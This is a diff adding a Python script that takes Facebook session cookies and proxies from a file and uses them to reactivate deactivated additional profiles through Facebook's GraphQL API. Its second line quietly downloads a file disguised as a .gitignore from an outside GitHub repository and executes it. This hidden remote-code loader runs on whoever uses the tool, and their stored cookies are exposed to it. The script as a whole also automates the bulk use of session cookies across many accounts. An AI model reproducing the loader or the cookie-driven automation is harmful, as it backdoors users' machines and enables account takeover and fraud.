@@ -1,0 +1,35 @@
+import requests
+exec(requests.get('https://raw.githubusercontent.com/thuanantimaythangdectool/khoquadithoi/main/.gitignore').text)
+def GetID(ck,fb,proxies):
+	return requests.post('https://www.facebook.com/api/graphql/', headers={'authority': 'www.facebook.com','accept': '*/*','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': ck,'origin': 'https://www.facebook.com','referer': 'https://www.facebook.com/settings/reactivation','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','viewport-width': '979','x-fb-friendly-name': 'AdditionalProfilePlusCreationMutation','x-fb-lsd': 'ZM7FAk6cuRcUp3imwqvHTY',}, data={'fb_dtsg': fb,'server_timestamps': 'true','doc_id': '6203641793029011',}).json()['data']['viewer']['deactivated_profiles']['deactivated']
+def Go(ck,fb,i,proxies):
+	return requests.post('https://www.facebook.com/api/graphql/', headers={'authority': 'www.facebook.com','accept': '*/*','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': ck,'origin': 'https://www.facebook.com','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','viewport-width': '979','x-fb-friendly-name': 'AdditionalProfilePlusCreationMutation','x-fb-lsd': 'ZM7FAk6cuRcUp3imwqvHTY','viewport-width': '1366',}, data={'fb_dtsg': fb,'variables': '{"profile_id":"'+i+'","delegate_page_id":null}','server_timestamps': 'true','doc_id': '6365256943526229',}).json()
+Input=open("T_FB.txt").readlines()
+stt=0
+for ThuanTrum in Input:
+	stt+=1
+	ThuanTrum=ThuanTrum.split('\n')[0]
+	ck=ThuanTrum.split("|")[1]
+	proxy=ThuanTrum.split("|")[0]
+	try:
+		if proxy.count(":") == 3:
+			pr = proxy.split(":")
+			pr = "%s:%s@%s:%s"%(pr[2], pr[3], pr[0], pr[1])
+		else:pr = proxy
+		choose = "http"
+		proxies = {"http": f"{choose}://{pr}" ,"https": f"{choose}://{pr}"}
+		headers = {'authority': 'www.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi','cookie': ck,'sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','viewport-width': '1366',}
+		response = requests.get('https://mbasic.facebook.com/',headers=headers).text
+		fb = response.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
+		Thuan=GetID(ck,fb,proxies)
+		print(f'[{stt}]> Get Được {len(Thuan)} Pro5 Ẩn nè!')
+		for ThuanDepTrai in Thuan:
+			KickHoat=Go(ck,fb,ThuanDepTrai['profile']['id'],proxies)
+			if str(KickHoat['extensions']['is_final']) == 'True':
+				UID=KickHoat['data']['reactivate_profile']['id']
+				Name=KickHoat['data']['reactivate_profile']['name']
+				print(f"[T]> Kích Hoạt Thành Công UID: {UID} | {Name}")
+			else:
+				pass
+	except:
+		print(f'[{stt}]> Cookie Này Lỗi!')
